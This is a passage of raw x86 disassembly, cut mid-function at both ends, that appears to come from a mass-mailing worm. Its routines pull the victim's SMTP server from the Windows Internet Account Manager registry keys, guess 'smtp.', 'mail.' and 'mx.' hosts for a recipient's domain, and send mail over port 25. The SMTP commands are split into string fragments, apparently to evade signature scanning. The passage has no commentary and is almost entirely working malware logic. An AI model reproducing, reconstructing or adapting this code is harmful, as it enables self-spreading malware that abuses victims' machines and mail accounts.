		inc	esi
		cmp	byte ptr [esi],	0Dh
		jnz	short loc_806655
		jmp	short loc_806654
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806649:				; CODE XREF: sub_8064EC+153j
		cmp	al, 0Dh
		jnz	short loc_806655
		inc	esi
		mov	al, [esi]
		cmp	al, 0Ah
		jnz	short loc_80665B

loc_806654:				; CODE XREF: sub_8064EC+15Bj
		inc	esi

loc_806655:				; CODE XREF: sub_8064EC+159j
					; sub_8064EC+15Fj
		mov	al, [esi]
		cmp	al, 0Ah
		jz	short loc_806667

loc_80665B:				; CODE XREF: sub_8064EC+166j
		cmp	al, 0Dh
		jz	short loc_806667
		test	al, al
		jnz	loc_806543

loc_806667:				; CODE XREF: sub_8064EC+12j
					; sub_8064EC+1Bj ...
		xor	eax, eax
		inc	eax

loc_80666A:				; CODE XREF: sub_8064EC+13Aj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80666F:				; CODE XREF: sub_8064EC+120j
					; sub_8064EC+124j
		mov	eax, esi
		dec	esi

loc_806672:				; CODE XREF: sub_8064EC+193j
		mov	cl, [eax]
		cmp	cl, 0Ah
		jz	short loc_80667E
		cmp	cl, 0Dh
		jnz	short loc_806681

loc_80667E:				; CODE XREF: sub_8064EC+18Bj
		inc	eax
		jmp	short loc_806672
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806681:				; CODE XREF: sub_8064EC+190j
		mov	al, [eax]
		cmp	al, 20h
		jz	short loc_80668B
		cmp	al, 9
		jnz	short loc_80661D

loc_80668B:				; CODE XREF: sub_8064EC+199j
					; sub_8064EC+1AAj
		mov	al, [esi]
		cmp	al, 0Ah
		jz	short loc_806695
		cmp	al, 0Dh
		jnz	short loc_806619

loc_806695:				; CODE XREF: sub_8064EC+1A3j
		inc	esi
		jmp	short loc_80668B
sub_8064EC	endp


;  S U B	R O U T	I N E 


sub_806698	proc near		; CODE XREF: sub_806765+32p
					; sub_806765+5Ap ...

arg_0		= dword	ptr  4

		mov	edx, [esp+arg_0]
		mov	eax, edx
		mov	cl, [edx]
		jmp	short loc_8066AA
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8066A2:				; CODE XREF: sub_806698+14j
		cmp	cl, 3Ch
		jz	short loc_8066BD
		inc	eax
		mov	cl, [eax]

loc_8066AA:				; CODE XREF: sub_806698+8j
		test	cl, cl
		jnz	short loc_8066A2
		cmp	byte ptr [eax],	3Ch
		jnz	short locret_8066C7
		jmp	short loc_8066BD
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8066B5:				; CODE XREF: sub_806698+2Aj
		cmp	cl, 3Eh
		jz	short loc_8066C4
		mov	[edx], cl
		inc	edx

loc_8066BD:				; CODE XREF: sub_806698+Dj
					; sub_806698+1Bj
		inc	eax
		mov	cl, [eax]
		test	cl, cl
		jnz	short loc_8066B5

loc_8066C4:				; CODE XREF: sub_806698+20j
		and	byte ptr [edx],	0

locret_8066C7:				; CODE XREF: sub_806698+19j
		retn
sub_806698	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_8066C8	proc near		; CODE XREF: sub_806765+D3p
					; sub_806765+10Bp ...

buf		= byte ptr -400h
s		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arglist		= byte ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 400h
		cmp	[ebp+arg_8], 0
		jz	short loc_80670B
		lea	eax, [ebp+arglist]
		push	eax		; arglist
		lea	eax, [ebp+buf]
		push	[ebp+arg_8]	; LPCSTR
		push	eax		; LPSTR
		call	ds:wvsprintfA
		lea	eax, [ebp+buf]
		push	0		; flags
		push	eax		; lpString
		call	ds:lstrlenA
		push	eax		; len
		lea	eax, [ebp+buf]
		push	eax		; buf
		push	[ebp+s]		; s
		call	ds:send

loc_80670B:				; CODE XREF: sub_8066C8+Dj
		push	esi
		mov	esi, 400h
		jmp	short loc_806746
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806713:				; CODE XREF: sub_8066C8+96j
		lea	ecx, [ebp+buf]
		xor	eax, eax

loc_80671B:				; CODE XREF: sub_8066C8+60j
		mov	dl, [ecx]
		cmp	dl, 20h
		jz	short loc_806727
		cmp	dl, 9
		jnz	short loc_80673A

loc_806727:				; CODE XREF: sub_8066C8+58j
		inc	ecx
		jmp	short loc_80671B
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80672A:				; CODE XREF: sub_8066C8+77j
		cmp	dl, 39h
		jg	short loc_806741
		movsx	edx, dl
		lea	eax, [eax+eax*4]
		inc	ecx
		lea	eax, [edx+eax*2-30h]

loc_80673A:				; CODE XREF: sub_8066C8+5Dj
		mov	dl, [ecx]
		cmp	dl, 30h
		jge	short loc_80672A

loc_806741:				; CODE XREF: sub_8066C8+65j
		cmp	byte ptr [ecx],	2Dh
		jnz	short loc_806762

loc_806746:				; CODE XREF: sub_8066C8+49j
		push	[ebp+arg_4]
		lea	eax, [ebp+buf]
		push	esi
		push	eax
		push	[ebp+s]
		call	sub_80641A
		add	esp, 10h
		test	eax, eax
		jg	short loc_806713
		xor	eax, eax

loc_806762:				; CODE XREF: sub_8066C8+7Cj
		pop	esi
		leave
		retn
sub_8066C8	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_806765	proc near		; CODE XREF: sub_8069EA+115p
					; sub_806B4F+A1p ...

var_308		= dword	ptr -308h
String1		= byte ptr -208h
var_108		= dword	ptr -108h
buf		= dword	ptr -8
s		= dword	ptr -4
name		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 308h
		push	esi
		mov	esi, 100h
		lea	eax, [ebp+var_108]
		push	esi
		push	eax
		mov	eax, [ebp+arg_4]
		push	offset aFrom	; "From"
		call	sub_8064EC
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_8067E6
		lea	eax, [ebp+var_108]
		push	eax
		call	sub_806698
		lea	eax, [ebp+var_308]
		push	esi
		push	eax
		mov	eax, [ebp+arg_4]
		push	offset aTo	; "To"
		call	sub_8064EC
		add	esp, 10h
		test	eax, eax
		jnz	short loc_8067E6
		lea	eax, [ebp+var_308]
		push	eax
		call	sub_806698
		pop	ecx
		lea	eax, [ebp+var_108]
		mov	cl, byte ptr [ebp+var_108]
		test	cl, cl
		jz	short loc_8067E6

loc_8067D5:				; CODE XREF: sub_806765+7Aj
		cmp	cl, 40h
		jz	short loc_8067E1
		inc	eax
		mov	cl, [eax]
		test	cl, cl
		jnz	short loc_8067D5

loc_8067E1:				; CODE XREF: sub_806765+73j
		cmp	byte ptr [eax],	0
		jnz	short loc_8067EE

loc_8067E6:				; CODE XREF: sub_806765+29j
					; sub_806765+51j ...
		xor	eax, eax
		inc	eax
		jmp	loc_8069E7
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8067EE:				; CODE XREF: sub_806765+7Fj
		inc	eax
		push	ebx
		push	eax		; lpString2
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		call	ds:lstrcpyA
		push	6		; protocol
		push	1		; type
		push	2		; af
		call	ds:socket
		mov	ebx, eax
		cmp	ebx, 0FFFFFFFFh
		mov	[ebp+s], ebx
		jnz	short loc_80681C
		xor	eax, eax
		inc	eax
		jmp	loc_8069E6
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80681C:				; CODE XREF: sub_806765+ADj
		push	edi
		push	10h		; namelen
		push	[ebp+name]	; name
		push	ebx		; s
		call	ds:connect
		test	eax, eax
		jnz	loc_8069D9
		push	eax
		push	3A98h
		push	ebx
		call	sub_8066C8
		mov	esi, 0C8h
		add	esp, 0Ch
		cmp	eax, esi
		jl	loc_8069D9
		cmp	eax, 190h
		jge	loc_8069D9
		lea	eax, [ebp+String1]
		mov	edi, 2710h
		push	eax
		push	offset aHlo	; "HLO"
		push	offset aESS	; "E%s %s\r\n"
		push	edi
		push	ebx
		call	sub_8066C8
		add	esp, 14h
		cmp	eax, esi
		jl	short loc_806883
		cmp	eax, 12Bh
		jle	short loc_8068B1

loc_806883:				; CODE XREF: sub_806765+115j
		lea	eax, [ebp+String1]
		push	eax
		push	offset aHel	; "HEL"
		push	offset aSoS	; "%sO %s\r\n"
		push	edi
		push	ebx
		call	sub_8066C8
		add	esp, 14h
		cmp	eax, esi
		jl	loc_8069D9
		cmp	eax, 12Bh
		jg	loc_8069D9

loc_8068B1:				; CODE XREF: sub_806765+11Cj
		lea	eax, [ebp+var_108]
		push	eax
		push	offset aIlF	; "IL F"
		push	offset aMaSromS	; "MA%sROM:<%s>\r\n"
		push	edi
		push	ebx
		call	sub_8066C8
		add	esp, 14h
		cmp	eax, esi
		jl	loc_8069D9
		cmp	eax, 12Bh
		jg	loc_8069D9
		lea	eax, [ebp+var_308]
		push	eax
		push	offset aPtT	; "PT T"
		push	offset aRcSoS	; "RC%sO:<%s>\r\n"
		push	edi
		push	ebx
		call	sub_8066C8
		add	esp, 14h
		cmp	eax, esi
		jl	loc_8069D9
		cmp	eax, 12Bh
		jg	loc_8069D9
		push	offset aData	; "DATA\r\n"
		push	edi
		push	ebx
		call	sub_8066C8
		add	esp, 0Ch
		cmp	eax, esi
		jl	loc_8069D9
		cmp	eax, 18Fh
		jg	loc_8069D9
		mov	ecx, [ebp+arg_4]
		mov	edi, ds:send
		mov	[ebp+buf], ecx

loc_80693B:				; CODE XREF: sub_806765+228j
		mov	al, [ecx]
		mov	ebx, ecx
		jmp	short loc_80694C
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806941:				; CODE XREF: sub_806765+1E9j
		cmp	al, 0Ah
		jz	short loc_80695A
		cmp	al, 0Dh
		jz	short loc_806950
		inc	ebx
		mov	al, [ebx]

loc_80694C:				; CODE XREF: sub_806765+1DAj
		test	al, al
		jnz	short loc_806941

loc_806950:				; CODE XREF: sub_806765+1E2j
					; sub_806765+1F6j
		mov	al, [ebx]
		cmp	al, 0Ah
		jz	short loc_80695A
		cmp	al, 0Dh
		jnz	short loc_80695D

loc_80695A:				; CODE XREF: sub_806765+1DEj
					; sub_806765+1EFj
		inc	ebx
		jmp	short loc_806950
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80695D:				; CODE XREF: sub_806765+1F3j
		cmp	ecx, ebx
		jz	short loc_80698F
		cmp	byte ptr [ecx],	2Eh
		jnz	short loc_806977
		push	0		; flags
		push	1		; len
		push	offset a__0	; buf
		push	[ebp+s]		; s
		call	edi ; send
		mov	ecx, [ebp+buf]

loc_806977:				; CODE XREF: sub_806765+1FFj
		mov	eax, ebx
		push	0		; flags
		sub	eax, ecx
		push	eax		; len
		push	ecx		; buf
		push	[ebp+s]		; s
		call	edi ; send
		test	eax, eax
		jle	short loc_8069D6
		mov	[ebp+buf], ebx
		mov	ecx, ebx
		jmp	short loc_80693B
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80698F:				; CODE XREF: sub_806765+1FAj
		push	0		; flags
		push	5		; len
		push	offset buf	; buf
		push	[ebp+s]		; s
		call	edi ; send
		push	0
		push	3A98h
		push	[ebp+s]
		call	sub_8066C8
		add	esp, 0Ch
		cmp	eax, esi
		jl	short loc_8069D6
		cmp	eax, 190h
		jge	short loc_8069D6
		push	offset aQuit	; "QUIT\r\n"
		push	1388h
		push	[ebp+s]
		call	sub_8066C8
		mov	ebx, [ebp+s]
		add	esp, 0Ch
		xor	esi, esi
		jmp	short loc_8069DC
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8069D6:				; CODE XREF: sub_806765+221j
					; sub_806765+24Cj ...
		mov	ebx, [ebp+s]

loc_8069D9:				; CODE XREF: sub_806765+C6j
					; sub_806765+E2j ...
		xor	esi, esi
		inc	esi

loc_8069DC:				; CODE XREF: sub_806765+26Fj
		push	ebx		; s
		call	ds:closesocket
		mov	eax, esi
		pop	edi

loc_8069E6:				; CODE XREF: sub_806765+B2j
		pop	ebx

loc_8069E7:				; CODE XREF: sub_806765+84j
		pop	esi
		leave
		retn
sub_806765	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_8069EA	proc near		; CODE XREF: sub_806B4F+177p

var_324		= dword	ptr -324h
Data		= byte ptr -224h
SubKey		= byte ptr -124h
ValueName	= byte ptr -0A4h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
cbData		= dword	ptr -14h
phkResult	= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
hKey		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 324h
		push	esi
		mov	esi, ds:wsprintfA
		mov	eax, offset aAccount ; "Account"
		push	edi
		push	eax
		push	eax
		push	offset aInternet ; "Internet"
		lea	eax, [ebp+SubKey]
		push	offset aSoftwareMicros ; LPCSTR
		push	eax		; LPSTR
		call	esi ; wsprintfA
		push	offset aServer	; "Server"
		push	offset aSmtp	; "SMTP"
		lea	eax, [ebp+ValueName]
		push	offset aSS	; LPCSTR
		push	eax		; LPSTR
		call	esi ; wsprintfA
		add	esp, 24h
		lea	eax, [ebp+hKey]
		xor	edi, edi
		push	eax		; phkResult
		push	20019h		; samDesired
		lea	eax, [ebp+SubKey]
		push	edi		; ulOptions
		push	eax		; lpSubKey
		push	80000001h	; hKey
		call	ds:RegOpenKeyExA
		test	eax, eax
		jz	short loc_806A5A
		xor	eax, eax
		inc	eax
		jmp	loc_806B4B
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806A5A:				; CODE XREF: sub_8069EA+66j
		mov	esi, 100h
		push	ebx
		mov	ebx, ds:RegEnumKeyA
		lea	eax, [ebp+var_324]
		push	esi
		push	eax
		mov	[ebp+var_8], edi
		mov	[ebp+var_C], edi
		push	edi
		jmp	loc_806B2C
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806A7A:				; CODE XREF: sub_8069EA+149j
		lea	eax, [ebp+phkResult]
		inc	[ebp+var_8]
		push	eax		; phkResult
		push	20019h		; samDesired
		lea	eax, [ebp+var_324]
		push	edi		; ulOptions
		push	eax		; lpSubKey
		push	[ebp+hKey]	; hKey
		call	ds:RegOpenKeyExA
		test	eax, eax
		jnz	loc_806B21
		push	esi
		lea	eax, [ebp+Data]
		push	edi
		push	eax
		call	memset
		add	esp, 0Ch
		lea	eax, [ebp+cbData]
		mov	[ebp+cbData], esi
		push	eax		; lpcbData
		lea	eax, [ebp+Data]
		push	eax		; lpData
		push	edi		; lpType
		lea	eax, [ebp+ValueName]
		push	edi		; lpReserved
		push	eax		; lpValueName
		push	[ebp+phkResult]	; hKey
		call	ds:RegQueryValueExA
		test	eax, eax
		jnz	short loc_806B13
		lea	edi, [ebp+Data]
		call	sub_8064B7
		test	eax, eax
		mov	[ebp+var_20], eax
		jz	short loc_806B11
		push	19h		; hostshort
		mov	word ptr [ebp+var_24], 2
		call	ds:htons
		push	[ebp+arg_0]
		mov	word ptr [ebp+var_24+2], ax
		lea	eax, [ebp+var_24]
		push	eax
		call	sub_806765
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_806B11
		mov	[ebp+var_C], 1

loc_806B11:				; CODE XREF: sub_8069EA+FAj
					; sub_8069EA+11Ej
		xor	edi, edi

loc_806B13:				; CODE XREF: sub_8069EA+E8j
		push	[ebp+phkResult]	; hKey
		call	ds:RegCloseKey
		cmp	[ebp+var_C], edi
		jnz	short loc_806B39

loc_806B21:				; CODE XREF: sub_8069EA+AFj
		lea	eax, [ebp+var_324]
		push	esi
		push	eax
		push	[ebp+var_8]

loc_806B2C:				; CODE XREF: sub_8069EA+8Bj
		push	[ebp+hKey]
		call	ebx
		test	eax, eax
		jz	loc_806A7A

loc_806B39:				; CODE XREF: sub_8069EA+135j
		push	[ebp+hKey]	; hKey
		call	ds:RegCloseKey
		xor	eax, eax
		cmp	[ebp+var_C], edi
		pop	ebx
		setz	al

loc_806B4B:				; CODE XREF: sub_8069EA+6Bj
		pop	edi
		pop	esi
		leave
		retn
sub_8069EA	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_806B4F	proc near		; CODE XREF: sub_80446C+55p

var_310		= dword	ptr -310h
String1		= byte ptr -210h
var_110		= dword	ptr -110h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 310h
		mov	eax, [ebp+arg_4]
		test	eax, eax
		jz	short loc_806BAA
		lea	ecx, [ebp+var_310]
		push	100h
		push	ecx
		push	offset aTo	; "To"
		call	sub_8064EC
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_806BAA
		lea	eax, [ebp+var_310]
		push	eax
		call	sub_806698
		pop	ecx
		lea	eax, [ebp+var_310]
		mov	cl, byte ptr [ebp+var_310]
		test	cl, cl
		jz	short loc_806BAA

loc_806B99:				; CODE XREF: sub_806B4F+54j
		cmp	cl, 40h
		jz	short loc_806BA5
		inc	eax
		mov	cl, [eax]
		test	cl, cl
		jnz	short loc_806B99

loc_806BA5:				; CODE XREF: sub_806B4F+4Dj
		cmp	byte ptr [eax],	0
		jnz	short loc_806BAF

loc_806BAA:				; CODE XREF: sub_806B4F+Ej
					; sub_806B4F+2Bj ...
		xor	eax, eax
		inc	eax
		leave
		retn
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806BAF:				; CODE XREF: sub_806B4F+59j
		push	ebx
		push	esi
		inc	eax
		push	edi
		push	eax		; lpString2
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		call	ds:lstrcpyA
		mov	esi, [ebp+arg_0]
		mov	ebx, ds:htons
		jmp	short loc_806BFD
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806BCC:				; CODE XREF: sub_806B4F+B0j
		lea	edi, [esi+8]
		call	sub_8064B7
		test	eax, eax
		mov	[ebp+var_C], eax
		jz	short loc_806BFB
		push	19h		; hostshort
		mov	word ptr [ebp+var_10], 2
		call	ebx ; htons
		push	[ebp+arg_4]
		mov	word ptr [ebp+var_10+2], ax
		lea	eax, [ebp+var_10]
		push	eax
		call	sub_806765
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_806C3E

loc_806BFB:				; CODE XREF: sub_806B4F+8Aj
		mov	esi, [esi]

loc_806BFD:				; CODE XREF: sub_806B4F+7Bj
		test	esi, esi
		jnz	short loc_806BCC

loc_806C01:				; CODE XREF: sub_806B4F+168j
		mov	eax, esi
		sub	eax, 0
		jz	short loc_806C53
		dec	eax
		jz	short loc_806C4C
		dec	eax
		jz	short loc_806C45
		dec	eax
		jnz	loc_806CBC
		push	offset aSmtp_	; "smtp."

loc_806C1A:				; CODE XREF: sub_806B4F+FBj
					; sub_806B4F+102j
		lea	eax, [ebp+var_110]
		push	eax
		call	strcpy
		lea	eax, [ebp+String1]
		push	eax
		lea	eax, [ebp+var_110]
		push	eax
		call	strcat
		add	esp, 10h
		jmp	short loc_806C68
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806C3E:				; CODE XREF: sub_806B4F+AAj
					; sub_806B4F+152j
		xor	eax, eax
		jmp	loc_806CCC
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806C45:				; CODE XREF: sub_806B4F+BDj
		push	offset aMail_	; "mail."
		jmp	short loc_806C1A
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806C4C:				; CODE XREF: sub_806B4F+BAj
		push	offset aMx_	; "mx."
		jmp	short loc_806C1A
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806C53:				; CODE XREF: sub_806B4F+B7j
		lea	eax, [ebp+String1]
		push	eax
		lea	eax, [ebp+var_110]
		push	eax
		call	strcpy
		pop	ecx
		pop	ecx

loc_806C68:				; CODE XREF: sub_806B4F+EDj
		cmp	byte ptr [ebp+var_110],	0
		jz	short loc_806CC3
		lea	edi, [ebp+var_110]
		call	sub_8064B7
		test	eax, eax
		mov	[ebp+var_C], eax
		jz	short loc_806CB6
		push	19h		; hostshort
		mov	word ptr [ebp+var_10], 2
		call	ebx ; htons
		push	[ebp+arg_4]
		mov	word ptr [ebp+var_10+2], ax
		lea	eax, [ebp+var_10]
		push	eax
		call	sub_806765
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_806C3E
		call	sub_802E9C
		movzx	eax, ax
		push	64h
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, 14h
		jl	short loc_806CC3

loc_806CB6:				; CODE XREF: sub_806B4F+132j
		inc	esi
		jmp	loc_806C01
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806CBC:				; CODE XREF: sub_806B4F+C0j
		and	byte ptr [ebp+var_110],	0

loc_806CC3:				; CODE XREF: sub_806B4F+120j
					; sub_806B4F+165j
		push	[ebp+arg_4]
		call	sub_8069EA
		pop	ecx

loc_806CCC:				; CODE XREF: sub_806B4F+F1j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_806B4F	endp


;  S U B	R O U T	I N E 


sub_806CD1	proc near		; CODE XREF: sub_8028E6+33p
					; sub_8071E7+4Dp ...

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		and	dword ptr [eax+14h], 0
		and	dword ptr [eax+10h], 0
		mov	dword ptr [eax], 67452301h
		mov	dword ptr [eax+4], 0EFCDAB89h
		mov	dword ptr [eax+8], 98BADCFEh
		mov	dword ptr [eax+0Ch], 10325476h
		retn
sub_806CD1	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_806CF9	proc near		; CODE XREF: sub_806E83+57p
					; sub_806E83+72p

var_70		= dword	ptr -70h
var_30		= dword	ptr -30h
var_20		= qword	ptr -20h
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 70h
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		push	edi
		lea	edi, [ebp+var_30]
		push	10h
		movsd
		movsd
		movsd
		movsd
		mov	esi, [ebp+arg_4]
		xor	eax, eax
		cmp	ds:byte_808240,	al
		pop	ecx
		lea	edi, [ebp+var_70]
		rep movsd
		jnz	short loc_806D6B
		mov	[ebp+var_4], 1
		mov	[ebp+var_18], 20h

loc_806D2F:				; CODE XREF: sub_806CF9+69j
		finit
		fstcw	word ptr [ebp+var_20]
		wait
		or	byte ptr [ebp+var_20+1], 0Ch
		fldcw	word ptr [ebp+var_20]
		fild	[ebp+var_18]
		fild	[ebp+var_4]
		fsin
		fabs
		fscale
		fistp	[ebp+var_20]
		wait
		mov	edx, [ebp+var_4]
		mov	ecx, dword ptr [ebp+var_20]
		inc	[ebp+var_4]
		cmp	[ebp+var_4], 40h
		mov	ds:dword_80813C[edx*4],	ecx
		jbe	short loc_806D2F
		mov	ds:byte_808240,	1

loc_806D6B:				; CODE XREF: sub_806CF9+26j
		mov	[ebp+var_10], eax

loc_806D6E:				; CODE XREF: sub_806CF9+168j
		movzx	ecx, ds:byte_8026E1[eax*2]
		and	[ebp+var_8], 0
		mov	dword ptr [ebp+var_20+4], ecx
		movzx	ecx, ds:byte_8026E0[eax*2]
		shl	eax, 6
		add	eax, offset dword_808140
		mov	[ebp+var_18], ecx
		mov	[ebp+var_C], eax

loc_806D93:				; CODE XREF: sub_806CF9+158j
		mov	eax, [ebp+var_8]
		mov	ebx, [ebp+var_10]
		and	eax, 3
		and	ecx, 0Fh
		movzx	edx, ds:byte_8026C0[eax+ebx*4]
		shl	eax, 2
		mov	[ebp+var_14], edx
		sub	ebx, 0
		movzx	edx, ds:byte_8026D3[eax]
		mov	esi, [ebp+edx*4+var_30]
		movzx	edx, ds:byte_8026D2[eax]
		mov	edi, [ebp+edx*4+var_30]
		movzx	edx, ds:byte_8026D1[eax]
		mov	edx, [ebp+edx*4+var_30]
		mov	[ebp+var_4], edx
		movzx	edx, ds:byte_8026D0[eax]
		lea	edx, [ebp+edx*4+var_30]
		mov	eax, [edx]
		jz	short loc_806E0C
		dec	ebx
		jz	short loc_806DFD
		dec	ebx
		jz	short loc_806DF4
		not	esi
